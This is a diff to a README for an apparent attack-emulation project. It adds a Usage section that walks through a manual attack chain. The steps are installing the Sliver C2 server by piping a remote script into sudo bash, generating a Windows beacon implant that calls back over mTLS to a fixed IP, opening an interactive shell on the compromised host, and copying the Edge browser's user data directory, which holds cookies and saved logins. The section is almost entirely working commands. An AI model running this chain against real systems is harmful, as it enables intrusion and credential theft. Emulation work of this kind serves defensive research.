@@ -51,7 +51,35 @@ Each folder in `examples/` contains an attach chain, which includes the emulatio
 
 
 ## Usage
-To be completed by Jiang Yi and Zhengkai.
+### The emulation infrastructure
+<p align="center">
+  <img width="900" src="images/the%20emulation%20infrastructure.png" alt="cli output"/>
+</p>
+
+### Execute the attack manually
+①Download the latest server release for your platform, and just run the binary.
+```
+kali > curl https://sliver.sh/install|sudo bash
+kali > sliver
+```
+②Generate a beacon implant for the Windows platform and enable mTLS monitoring with the specified IP address.
+```
+sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save .
+sliver > mtls
+```
+③Download the sliver implant manually and execute it on the target machine.
+④Interact with a specific session identified by session_id.
+```
+sliver > sessions -i session_id
+```
+⑤Open an interactive powershell on the compromised machine.
+```
+sliver (SESSION_NAME) > shell
+```
+⑥Copy the Edge browser's default user data directory to a specified location for further analysis.
+```
+Powershell > Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination "C:\Users\win\Desktop\Edge" -Force -Recurse
+```
 
 ## System Overview
 <p align="center">
